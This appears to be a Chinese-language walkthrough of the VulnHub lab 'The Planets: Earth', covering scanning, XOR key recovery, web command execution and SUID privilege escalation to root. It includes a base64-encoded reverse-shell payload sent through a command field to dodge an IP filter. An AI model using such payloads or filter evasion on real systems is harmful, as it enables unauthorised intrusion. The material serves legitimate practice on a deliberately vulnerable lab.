---
sidebar_position: 3
tags: [Easy, Linux, 密码学, 命令执行, SUID, 逆向]
title: "The Planets: Earth"
sidebar_label: "The Planets: Earth"
---
# The Planets: Earth
## 端口扫描
```bash
jtz@attacker:~/CTF/VulhHub$ nmap -sTCV -p- --min-rate 1000 192.168.1.11
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-17 15:55 CST
Nmap scan report for earth (192.168.1.11)
Host is up (0.0025s latency).
Not shown: 65398 filtered tcp ports (no-response), 134 filtered tcp ports (host-unreach)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey: 
|   256 5b2c3fdc8b76e9217bd05624dfbee9a8 (ECDSA)
|_  256 b03c723b722126ce3a84e841ecc8f841 (ED25519)
80/tcp  open  http     Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
|_http-title: Bad Request (400)
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
443/tcp open  ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space
| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local
| Not valid before: 2021-10-12T23:26:31
|_Not valid after:  2031-10-10T23:26:31
|_http-title: Bad Request (400)
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
| tls-alpn: 
|_  http/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 143.14 second
```
## 443
从上面的扫描结果中我们可以看到一个 `DNS:earth.local, DNS:terratest.earth.local` 说明存在DNS 的情况, 之后开始进行目录扫描
- 访问主页面后, 我发现这是存在一些加密的内容, 同时这里也表明这是一个加密信息的地方, 之后经过一些测试我猜测这是 XOR 加密, 那么我们应该去解密这些密文信息
- 从扫描结果中可以发现一个 admin 目录这里告诉我们需要登陆
```bash
jtz@attacker:~/CTF/VulhHub$ gobuster dir  -u https://earth.local -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html -k===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://earth.local
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
2023/12/17 17:33:20 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 0] [--> /admin/]
```
之后开始扫描子站点, 观察扫描的结果在其中发现了 `robots.txt` 之后查看 robots.txt 中内容, 我在其中发现 `/testingnotes.*`
```bash
jtz@attacker:~/CTF/VulhHub$ gobuster dir  -u https://terratest.earth.local -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html -k
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://terratest.earth.local
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
2023/12/17 17:29:09 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 199]
/index.html           (Status: 200) [Size: 26]
/robots.txt           (Status: 200) [Size: 521]
```
之后我查看了 `testingnotes.txt` 在其中发现了一些内容:

- 登陆的用户名称 : terra
- 使用 XOR 加密, 符合我们的推测
- 一个新的文件 `testdata.txt` : 根据前后内容提示来看这是一个原文, 也就是说原本的密文中有一个是该项的加密信息
```bash
Testing secure messaging system notes:
*Using XOR encryption as the algorithm, should be safe as used in RSA.
*Earth has confirmed they have received our sent messages.
*testdata.txt was used to test encryption.
*terra used as username for admin portal.
Todo:
*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
*Need to test different key lengths to protect against bruteforce. How long should the key be?
*Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.
```
之后进行解密, 最终我获取到一个 `Key: earthclimatechangebad4humans`
![20240524133639](https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240524133639.png)
随后我将 Key 作为用户的密码进行登陆发现可以, 登陆之后发现是一个命令执行的地方
![20240524133655](https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240524133655.png)
## 后渗透
### apache
我们只需要利用上面的命令执行进行利用即可, 但是这里做了限制不允许外连, 所以我们需要编码为 base64 进行利用
:::tip
登陆后查看源码发现其对我们输入的内容正则匹配其中的 IP 地址
:::
```bash
csrfmiddlewaretoken=to9lvTx1MEsuwOBdspfOp6KEXPq63VgERsKZobd8MH4Kuu3eK2fJrDyDAh0On4LG&cli_command=echo+'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMS43LzQ0NDQgMD4mMQ=='|base64+-d|bash
```
![20240524133736](https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240524133736.png)
### apache --> root
![20240524133755](https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240524133755.png)
在这里可以发现存在两个未知的 SUID 程序, 之后据此我查看程序, 在此可以看到对应的程序会重置用户的密码但是需要一些条件才可以进行
```bash
(remote) apache@earth:/tmp$ strings  /usr/bin/reset_root
/lib64/ld-linux-x86-64.so.2
CHECKING IF RESET TRIGGERS PRESENT...
RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth
/usr/bin/echo 'root:Earth' | /usr/sbin/chpasswd
RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
```
将对应的程序下载到本地并使用反编译工具打开, 分析其结构, 通过此可以知道对应的程序需要判断三个条件
```bash
puts("CHECKING IF RESET TRIGGERS PRESENT...");
magic_cipher(&local_1098,local_58,local_1078,0x11,0x12);
local_1067 = 0;
iVar1 = access(local_1078,0);
if (iVar1 == 0) {
    local_c = local_c + 1;
}
magic_cipher(&local_10b8,local_58,local_1078,0x11,0x12);
local_1067 = 0;
iVar1 = access(local_1078,0);
if (iVar1 == 0) {
    local_c = local_c + 1;
}
magic_cipher(&local_10c5,local_58,local_1078,0xd,0x12);
local_106b = 0;
iVar1 = access(local_1078,0);
if (iVar1 == 0) {
    local_c = local_c + 1;
}
if (local_c == 3) {
    puts("RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth");
    setuid(0);
    system("/usr/bin/echo \'root:Earth\' | /usr/sbin/chpasswd");
}
else {
    puts("RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.");
}
```
然后我使用 ltrace 程序进行打开, 获取到了对应的条件
```bash
jtz@attacker:~/CTF/VulhHub$ ltrace ./reset_root 
puts("CHECKING IF RESET TRIGGERS PRESE"...CHECKING IF RESET TRIGGERS PRESENT...
)                                                      = 38
access("/dev/shm/kHgTFI5G", 0)                                                                   = -1
access("/dev/shm/Zw7bV9U5", 0)                                                                   = -1
access("/tmp/kcM0Wewe", 0)                                                                       = -1
puts("RESET FAILED, ALL TRIGGERS ARE N"...RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
)                                                      = 44
+++ exited (status 0) +++
```
之后创建对应的文件, 再执行程序应该就可以了
```bash
(remote) apache@earth:/tmp$ touch /dev/shm/kHgTFI5G
(remote) apache@earth:/tmp$ touch /dev/shm/Zw7bV9U5
(remote) apache@earth:/tmp$ touch /tmp/kcM0Wewe
(remote) apache@earth:/tmp$ /usr/bin/reset_root
CHECKING IF RESET TRIGGERS PRESENT...
RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth
(remote) apache@earth:/tmp$ su root
Password: 
(remote) root@earth:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```